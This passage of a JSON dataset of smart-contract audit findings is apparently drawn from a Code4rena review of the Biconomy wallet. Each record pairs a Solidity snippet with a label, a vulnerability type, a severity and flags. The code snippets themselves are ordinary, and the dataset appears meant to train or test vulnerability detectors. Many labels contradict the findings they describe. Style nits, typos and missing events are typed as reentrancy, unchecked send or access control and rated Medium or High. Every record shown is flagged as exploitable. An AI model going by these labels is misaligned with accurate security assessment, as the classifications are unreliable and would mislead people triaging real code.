    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFile: scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol\n\n/// @audit entryPoint() came earlier\n109:      function setOwner(address _newOwner) external mixedAuth {\n\n/// @audit max() came earlier\n192       function execTransaction(\n193           Transaction memory _tx,\n194           uint256 batchId,\n195           FeeRefund memory refundInfo,\n196           bytes memory signatures\n197:      ) public payable virtual override returns (bool success) {\n\n/// @audit handlePayment() came earlier\n271       function handlePaymentRevert(\n272           uint256 gasUsed,\n273           uint256 baseGas,\n274           uint256 gasPrice,\n275           uint256 tokenGasPriceFactor,\n276           address gasToken,\n277           address payable refundReceiver\n278:      ) external returns (uint256 payment) {\n\n/// @audit checkSignatures() came earlier\n363       function requiredTxGas(\n364           address to,\n365           uint256 value,\n366           bytes calldata data,\n367           Enum.Operation operation\n368:      ) external returns (uint256) {\n\n/// @audit encodeTransactionData() came earlier\n449:      function transfer(address payable dest, uint amount) external nonReentrant onlyOwner {\n\n/// @audit _call() came earlier\n489:      function execFromEntryPoint(address dest, uint value, bytes calldata func, Enum.Operation operation, uint256 gasLimit) external onlyEntryPoint returns (bool success) {        \n\n/// @audit _validateSignature() came earlier\n518:      function getDeposit() public view returns (uint256) {\n\n/// @audit withdrawDepositTo() came earlier\n545:      function supportsInterface(bytes4 interfaceId) external view virtual override returns (bool) {\n\n/// @audit supportsInterface() came earlier\n550:      receive() external payable {}\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "reentrancy",
    "severity": "Low",
    "title": "[N&#x2011;28]  Function ordering does not follow the Solidity style guide",
    "description": "According to the [Solidity style guide](https://docs.soliditylang.org/en/v0.8.17/style-guide.html#order-of-functions), functions should be laid out in the following order :`constructor()`, `receive()`, `fallback()`, `external`, `public`, `internal`, `private`, but the cases below do not follow this pattern *There are 31 instances of this issue:* File: scw-contracts/contracts/smart-contract-wallet/aa-4337/core/EntryPoint.sol /// @audit _executeUserOp() came earlier 68:       function handleOps(UserOperation[] calldata ops, address payable beneficiary) public {",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 48,
    "has_external_calls": true,
    "has_state_changes": false,
    "complexity_score": 1.0,
    "vulnerability_types": [
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFile: scw-contracts/contracts/smart-contract-wallet/aa-4337/interfaces/IPaymaster.sol\n\n/// @audit function postOp came earlier\n42        enum PostOpMode {\n43            opSucceeded, // user op succeeded\n44            opReverted, // user op reverted. still has to pay for gas.\n45            postOpReverted //user op succeeded, but caused postOp to revert. Now its a 2nd call, after user's op was deliberately reverted.\n46:       }\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "access_control",
    "severity": "Low",
    "title": "[N&#x2011;29]  Contract does not follow the Solidity style guide's suggested layout ordering",
    "description": "The [style guide](https://docs.soliditylang.org/en/v0.8.16/style-guide.html#order-of-layout) says that, within a contract, the ordering should be 1) Type declarations, 2) State variables, 3) Events, 4) Modifiers, and 5) Functions, but the contract(s) below do not follow this ordering *There are 3 instances of this issue:* File: scw-contracts/contracts/smart-contract-wallet/aa-4337/interfaces/IPaymaster.sol /// @audit function postOp came earlier 42        enum PostOpMode {",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 11,
    "has_external_calls": true,
    "has_state_changes": false,
    "complexity_score": 0.44,
    "vulnerability_types": [
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "\nhttps://github.com/code-423n4/2023-01-biconomy/blob/53c8c3823175aeb26dee5529eeefa81240a406ba/scw-contracts/contracts/smart-contract-wallet/interfaces/ERC1155TokenReceiver.sol#L7\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Medium",
    "title": "[N&#x2011;30]  Interfaces should be indicated with an `I` prefix in the contract name",
    "description": "*There are 3 instances of this issue:* File: scw-contracts/contracts/smart-contract-wallet/interfaces/ERC1155TokenReceiver.sol 7:    interface ERC1155TokenReceiver { https://github.com/code-423n4/2023-01-biconomy/blob/53c8c3823175aeb26dee5529eeefa81240a406ba/scw-contracts/contracts/smart-contract-wallet/interfaces/ERC1155TokenReceiver.sol#L7 File: scw-contracts/contracts/smart-contract-wallet/interfaces/ERC721TokenReceiver.sol",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 4,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.18,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "solidity\nFile: scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol\n\n/// @audit (valid but excluded finding)\n347:              _signer = ecrecover(keccak256(abi.encodePacked(\"\\x19Ethereum Signed Message:\\n32\", dataHash)), v - 4, r, s);\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Medium",
    "title": "[L&#x2011;01]  `abi.encodePacked()` should not be used with dynamic types when passing the result to a hash function such as `keccak256()`",
    "description": "Use `abi.encode()` instead which will pad items to 32 bytes, which will [prevent hash collisions](https://docs.soliditylang.org/en/v0.8.13/abi-spec.html#non-standard-packed-mode) (e.g. `abi.encodePacked(0x123,0x456)` => `0x123456` => `abi.encodePacked(0x1,0x23456)`, but `abi.encode(0x123,0x456)` => `0x0...1230...456`). \"Unless there is a compelling reason, `abi.encode` should be preferred\". If there is only one argument to `abi.encodePacked()` it can often be cast to `bytes()` or `bytes32()` [instead](https://ethereum.stackexchange.com/questions/30912/how-to-compare-strings-in-solidity#answer-82739). If all arguments are strings and or bytes, `bytes.concat()` should be used instead *There is 1 instance of this issue:* File: scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol /// @audit (valid but excluded finding)",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 7,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.247,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "solidity\nFile: scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol\n\n/// @audit (valid but excluded finding)\n371:          require(execute(to, value, data, operation, gasleft()));\n\n/// @audit (valid but excluded finding)\n528:          require(req);\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Medium",
    "title": "[N&#x2011;01]  `require()`/`revert()` statements should have descriptive reason strings",
    "description": "*There are 4 instances of this issue:* File: scw-contracts/contracts/smart-contract-wallet/libs/Math.sol /// @audit (valid but excluded finding) 78:               require(denominator > prod1); https://github.com/code-423n4/2023-01-biconomy/blob/53c8c3823175aeb26dee5529eeefa81240a406ba/scw-contracts/contracts/smart-contract-wallet/libs/Math.sol#L78",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 10,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.26,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFile: scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol\n\n/// @audit (valid but excluded finding)\n155       function getNonce(uint256 batchId)\n156       public view\n157:      returns (uint256) {\n\n/// @audit (valid but excluded finding)\n389       function getTransactionHash(\n390           address to,\n391           uint256 value,\n392           bytes calldata data,\n393           Enum.Operation operation,\n394           uint256 targetTxGas,\n395           uint256 baseGas,\n396           uint256 gasPrice,\n397           uint256 tokenGasPriceFactor,\n398           address gasToken,\n399           address payable refundReceiver,\n400           uint256 _nonce\n401:      ) public view returns (bytes32) {\n\n/// @audit (valid but excluded finding)\n518:      function getDeposit() public view returns (uint256) {\n\n/// @audit (valid but excluded finding)\n525       function addDeposit() public payable {\n526   \n527:          (bool req,) = address(entryPoint()).call{value : msg.value}(\"\");\n\n/// @audit (valid but excluded finding)\n536:      function withdrawDepositTo(address payable withdrawAddress, uint256 amount) public onlyOwner {\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "access_control",
    "severity": "Low",
    "title": "[N&#x2011;02]  `public` functions not called by the contract should be declared `external` instead",
    "description": "Contracts [are allowed](https://docs.soliditylang.org/en/latest/contracts.html#function-overriding) to override their parents' functions and change the visibility from `external` to `public`. *There are 18 instances of this issue:* File: scw-contracts/contracts/smart-contract-wallet/aa-4337/core/EntryPoint.sol /// @audit (valid but excluded finding) 68:       function handleOps(UserOperation[] calldata ops, address payable beneficiary) public {",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 35,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 1.0,
    "vulnerability_types": [
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFile: scw-contracts/contracts/smart-contract-wallet/base/FallbackManager.sol\n\n/// @audit 96 - (valid but excluded finding)\n43:               mstore(calldatasize(), shl(96, caller()))\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Medium",
    "title": "[N&#x2011;03]  `constant`s should be defined rather than using magic numbers",
    "description": "Even [assembly](https://github.com/code-423n4/2022-05-opensea-seaport/blob/9d7ce4d08bf3c3010304a0476a785c70c0e90ae7/contracts/lib/TokenTransferrer.sol#L35-L39) can benefit from using readable constants instead of hex/numeric literals *There is 1 instance of this issue:* File: scw-contracts/contracts/smart-contract-wallet/base/FallbackManager.sol /// @audit 96 - (valid but excluded finding) 43:               mstore(calldatasize(), shl(96, caller()))",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 7,
    "has_external_calls": true,
    "has_state_changes": false,
    "complexity_score": 0.193,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFile: scw-contracts/contracts/smart-contract-wallet/aa-4337/interfaces/IStakeManager.sol\n\n/// @audit (valid but excluded finding)\n11        event Deposited(\n12            address indexed account,\n13            uint256 totalDeposit\n14:       );\n\n/// @audit (valid but excluded finding)\n16        event Withdrawn(\n17            address indexed account,\n18            address withdrawAddress,\n19            uint256 amount\n20:       );\n\n/// @audit (valid but excluded finding)\n23        event StakeLocked(\n24            address indexed account,\n25            uint256 totalStaked,\n26            uint256 withdrawTime\n27:       );\n\n/// @audit (valid but excluded finding)\n30        event StakeUnlocked(\n31            address indexed account,\n32            uint256 withdrawTime\n33:       );\n\n/// @audit (valid but excluded finding)\n35        event StakeWithdrawn(\n36            address indexed account,\n37            address withdrawAddress,\n38            uint256 amount\n39:       );\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Low",
    "title": "[N&#x2011;04]  Event is missing `indexed` fields",
    "description": "Index event fields make the field more quickly accessible [to off-chain tools](https://ethereum.stackexchange.com/questions/40396/can-somebody-please-explain-the-concept-of-event-indexing) that parse events. However, note that each index field costs extra gas during emission, so it's not necessarily best to index the maximum allowed per event (three fields). Each `event` should use three `indexed` fields if there are three or more fields, and gas usage is not particularly of concern for the events in question. If there are fewer than three fields, all of the fields should be indexed. *There are 17 instances of this issue:* File: scw-contracts/contracts/smart-contract-wallet/aa-4337/interfaces/IEntryPoint.sol /// @audit (valid but excluded finding) 37:       event AccountDeployed(bytes32 indexed userOpHash, address indexed sender, address factory, address paymaster);",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 37,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.986,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\n35: assembly {\n        let handler := sload(slot)\n        if iszero(handler) {\n            return(0, 0)\n        }\n        calldatacopy(0, 0, calldatasize())\n        // The msg.sender address is shifted to the left by 12 bytes to remove the padding\n        // Then the address without padding is stored right after the calldata\n        mstore(calldatasize(), shl(96, caller()))\n        // Add 20 bytes for the address appended add the end\n        let success := call(gas(), handler, 0, 0, add(calldatasize(), 20), 0, 0)\n        returndatacopy(0, 0, returndatasize())\n        if iszero(success) {\n            revert(0, returndatasize())\n        }\n        return(0, returndatasize())\n    }\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Medium",
    "title": "<ins>Proof Of Concept</ins>",
    "description": "POC can be found in the above medium reference url. Functions that execute low level calls in contracts with solidity version under 0.8.14 512: assembly {mstore(0, number())} https://github.com/code-423n4/2023-01-biconomy/tree/main/scw-contracts/contracts/smart-contract-wallet/aa-4337/core/EntryPoint.sol#L512 63: assembly {",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 19,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.696,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\n46: //     \"AccountTx(address to,uint256 value,bytes data,uint8 operation,uint256 targetTxGas,uint256 baseGas,uint256 gasPrice,address gasToken,address refundReceiver,uint256 nonce)\"\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Low",
    "title": "<ins>Proof Of Concept</ins>",
    "description": "46: //     \"AccountTx(address to,uint256 value,bytes data,uint8 operation,uint256 targetTxGas,uint256 baseGas,uint256 gasPrice,address gasToken,address refundReceiver,uint256 nonce)\" https://github.com/code-423n4/2023-01-biconomy/tree/main/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L46 186: /// @dev Allows to execute a Safe transaction confirmed by required number of owners and then pays the account that submitted the transaction. https://github.com/code-423n4/2023-01-biconomy/tree/main/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L186 357: ///      Since the `estimateGas` function includes refunds, call this method to get an estimated of the costs that are deducted from the safe with `execTransaction`",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 3,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.192,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "192: function execTransaction(\n        Transaction memory _tx,\n        uint256 batchId,\n        FeeRefund memory refundInfo,\n        bytes memory signatures\n    ) public payable virtual override returns (bool success) {\n        // initial gas = 21k + non_zero_bytes * 16 + zero_bytes * 4\n        //            ~= 21k + calldata.length * [1/3 * 16 + 2/3 * 4]\n        uint256 startGas = gasleft() + 21000 + msg.data.length * 8;\n        //console.log(\"init %s\", 21000 + msg.data.length * 8);\n        bytes32 txHash;\n        // Use scope here to limit variable lifetime and prevent `stack too deep` errors\n        {\n            bytes memory txHashData =\n                encodeTransactionData(\n                    // Transaction info\n                    _tx,\n                    // Payment info\n                    refundInfo,\n                    // Signature info\n                    nonces[batchId]\n                );\n            // Increase nonce and execute transaction.\n            // Default space aka batchId is 0\n            nonces[batchId]++;\n            txHash = keccak256(txHashData);\n            checkSignatures(txHash, txHashData, signatures);\n        }\n\n\n        // We require some gas to emit the events (at least 2500) after the execution and some to perform code until the execution (500)\n        // We also include the 1/64 in the check that is not send along with a call to counteract potential shortings because of EIP-150\n        require(gasleft() >= max((_tx.targetTxGas * 64) / 63,_tx.targetTxGas + 2500) + 500, \"BSA010\");\n        // Use scope here to limit variable lifetime and prevent `stack too deep` errors\n        {\n            // If the gasPrice is 0 we assume that nearly all available gas can be used (it is always more than targetTxGas)\n            // We only substract 2500 (compared to the 3000 before) to ensure that the amount passed is still higher than targetTxGas\n            success = execute(_tx.to, _tx.value, _tx.data, _tx.operation, refundInfo.gasPrice == 0 ? (gasleft() - 2500) : _tx.targetTxGas);\n            // If no targetTxGas and no gasPrice was set (e.g. both are 0), then the internal tx is required to be successful\n            // This makes it possible to use `estimateGas` without issues, as it searches for the minimum gas where the tx doesn't revert\n            require(success || _tx.targetTxGas != 0 || refundInfo.gasPrice != 0, \"BSA013\");\n            // We transfer the calculated tx costs to the tx.origin to avoid sending it to intermediate contracts that have made calls\n            uint256 payment = 0;\n            // uint256 extraGas;\n            if (refundInfo.gasPrice > 0) {\n                //console.log(\"sent %s\", startGas - gasleft());\n                // extraGas = gasleft();\n                payment = handlePayment(startGas - gasleft(), refundInfo.baseGas, refundInfo.gasPrice, refundInfo.tokenGasPriceFactor, refundInfo.gasToken, refundInfo.refundReceiver);\n                emit WalletHandlePayment(txHash, payment);\n            }\n            // extraGas = extraGas - gasleft();\n            //console.log(\"extra gas %s \", extraGas);\n        }\n    }",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "High",
    "title": "<ins>Proof Of Concept</ins>",
    "description": "All in-scope contracts. i.e. Such as SmartAccount.sol 192: function execTransaction( Transaction memory _tx, uint256 batchId,",
    "confidence": 0.9,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 54,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 1.0,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": true,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "\nhttps://github.com/OpenZeppelin/openzeppelin-contracts-upgradeable/blob/master/contracts/security/ReentrancyGuardUpgradeable.sol#L40-L46\n\n* Setting an owner could be separated into a 2-step process to prevent accidental mistakes:\n",
    "vulnerability_label": 1,
    "vulnerability_type": "reentrancy",
    "severity": "Low",
    "title": "* ```ReentrancyGuardUpgradeable``` is not initialized by calling ```__ReentrancyGuard_init``` or ```__ReentrancyGuard_init_unchained```:",
    "description": "contract SmartAccount is ... ReentrancyGuardUpgradeable https://github.com/OpenZeppelin/openzeppelin-contracts-upgradeable/blob/master/contracts/security/ReentrancyGuardUpgradeable.sol#L40-L46 * Setting an owner could be separated into a 2-step process to prevent accidental mistakes:",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 5,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.231,
    "vulnerability_types": [
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "\nFile: contracts/smart-contract-wallet/common/Singleton.sol\n\n13: assert(_IMPLEMENTATION_SLOT == bytes32(uint256(keccak256(\"biconomy.scw.proxy.implementation\")) - 1));\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Medium",
    "title": "01 require() should be used instead of assert()",
    "description": "Assert should not be used except for tests,\u00a0`require`\u00a0should be used Prior to Solidity 0.8.0, pressing a confirm consumes the remainder of the process\u2019s available gas instead of returning it, as request()/revert() did. Assertion() should be avoided even after solidity version 0.8.0, because its documentation states \u201cThe Assert function generates an error of type Panic(uint256). Code that works properly should never Panic, even on invalid external input. If this happens, you need to fix it in your contract. there\u2019s a mistake\u201d. _There are 2 instances of this issue_ https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/Proxy.sol",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 5,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.167,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "\nFile: contracts/smart-contract-wallet/SmartAccount.sol\n\n257: address payable receiver = refundReceiver == address(0) ? payable(tx.origin) : refundReceiver;\n281: address payable receiver = refundReceiver == address(0) ? payable(tx.origin) : refundReceiver;\n511: require(owner == hash.recover(userOp.signature) || tx.origin == address(0), \"account: wrong signature\");\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Medium",
    "title": "02 Avoid using tx.origin",
    "description": "`tx.origin`\u00a0is a global variable in Solidity that returns the address of the account that sent the transaction. Using the variable could make a contract vulnerable if an authorized account calls a malicious contract. You can impersonate a user using a third party contract. This can make it easier to create a vault on behalf of another user with an external administrator (by receiving it as an argument). _There are 3 instances of this issue_ https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 7,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.367,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "\nFile: contracts/smart-contract-wallet/SmartAccount.sol\n\n28: ReentrancyGuardUpgradeable\n",
    "vulnerability_label": 1,
    "vulnerability_type": "reentrancy",
    "severity": "Low",
    "title": "03 Upgradeable contract is missing a \\_\\_gap[50] storage variable to allow for new storage variables in later versions",
    "description": "See\u00a0[this](https://docs.openzeppelin.com/contracts/4.x/upgradeable#storage_gaps)\u00a0link for a description of this storage variable. While some contracts may not currently be sub-classed, adding the variable now protects against forgetting to add it in the future. _There is 1 instance of this issue:_ https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol File: contracts/smart-contract-wallet/SmartAccount.sol 28: ReentrancyGuardUpgradeable",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 5,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.088,
    "vulnerability_types": [
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "\nFile: contracts/smart-contract-wallet/libs/Math.sol\n\n261: if (value >= 10**64) {\n262: value /= 10**64;\n265: if (value >= 10**32) {\n266: value /= 10**32;\n269: if (value >= 10**16) {\n270: value /= 10**16;\n273:\u00a0if (value >= 10**8) {\n274: value /= 10**8;\n277: if (value >= 10**4) {\n278: value /= 10**4;\n281: if (value >= 10**2) {\n282: value /= 10**2;\n285: if (value >= 10**1) {\n299: return result + (rounding == Rounding.Up && 10**result < value ? 1 : 0);\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Medium",
    "title": "04 Use scientific notation rather than exponentiation",
    "description": "Use scientific notation (e.g. 1e18) rather than exponentiation (e.g. `10**18`) Scientific notation should be used for better code readability _There are 14 instances of this issue_ https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/libs/Math.sol File: contracts/smart-contract-wallet/libs/Math.sol",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 18,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.453,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "\nFile: contracts/smart-contract-wallet/SmartAccount.sol\n\n347: _signer = ecrecover(keccak256(abi.encodePacked(\"\\x19Ethereum Signed Message:\\n32\", dataHash)), v - 4, r, s);\n350: _signer = ecrecover(dataHash, v, r, s);\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Medium",
    "title": "05 Best practice is to prevent signature malleability",
    "description": "Use OpenZeppelin\u2019s\u00a0`ECDSA`\u00a0contract rather than calling\u00a0`ecrecover()`\u00a0directly _There are 2 instances of this issue_ https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol File: contracts/smart-contract-wallet/SmartAccount.sol 347: _signer = ecrecover(keccak256(abi.encodePacked(\"\\x19Ethereum Signed Message:\\n32\", dataHash)), v - 4, r, s);",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 6,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.216,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "\nFile: contracts/smart-contract-wallet/aa-4337/core/EntryPoint.sol\n\n255: // TODO: copy logic of gasPrice?\n",
    "vulnerability_label": 1,
    "vulnerability_type": "dos",
    "severity": "Medium",
    "title": "06 Open TODOS",
    "description": "Code architecture, incentives, and error handling/reporting questions/issues should be resolved before deployment _There is 1 instance of this issue_ https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/aa-4337/core/EntryPoint.sol File: contracts/smart-contract-wallet/aa-4337/core/EntryPoint.sol 255: // TODO: copy logic of gasPrice?",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 5,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.106,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      1,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "\nFile: contracts/smart-contract-wallet/paymasters/verifying/singleton/VerifyingSingletonPaymaster.sol\n\n65: function setSigner( address _newVerifyingSigner) external onlyOwner{\n",
    "vulnerability_label": 1,
    "vulnerability_type": "access_control",
    "severity": "High",
    "title": "07 Missing events for functions that change critical parameters",
    "description": "The afunctions that change critical parameters should emit events. Events allow capturing the changed parameters so that off-chain tools/interfaces can register such changes with timelocks that allow users to evaluate them and consider if they would like to engage/exit based on how they perceive the changes as affecting the trustworthiness of the protocol or profitability of the implemented financial services. The alternative of directly querying on-chain contract state for such changes is not considered practical for most users/usages. Missing events and timelocks do not promote transparency and if such changes immediately affect users\u2019 perception of fairness or trustworthiness, they could exit the protocol causing a reduction in liquidity which could negatively impact protocol TVL and reputation. _There are 3 instances of this issue_ https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/common/Singleton.sol File: contracts/smart-contract-wallet/common/Singleton.sol",
    "confidence": 0.9,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 5,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.176,
    "vulnerability_types": [
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": true,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "\nFile: contracts/smart-contract-wallet/aa-4337/core/EntryPoint.sol\n\n43: * @param opIndex into into the opInfo array\n144: //a memory copy of UserOp fields (except that dynamic byte arrays: callData, initCode and signature\n250: //when using a Paymaster, the verificationGasLimit is used also to as a limit for the postOp call.\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Medium",
    "title": "08 Typos",
    "description": "_There are 6 instances of this issue_ https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/aa-4337/core/EntryPoint.sol File: contracts/smart-contract-wallet/aa-4337/core/EntryPoint.sol 43: * @param opIndex into into the opInfo array 144: //a memory copy of UserOp fields (except that dynamic byte arrays: callData, initCode and signature",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 7,
    "has_external_calls": true,
    "has_state_changes": false,
    "complexity_score": 0.325,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
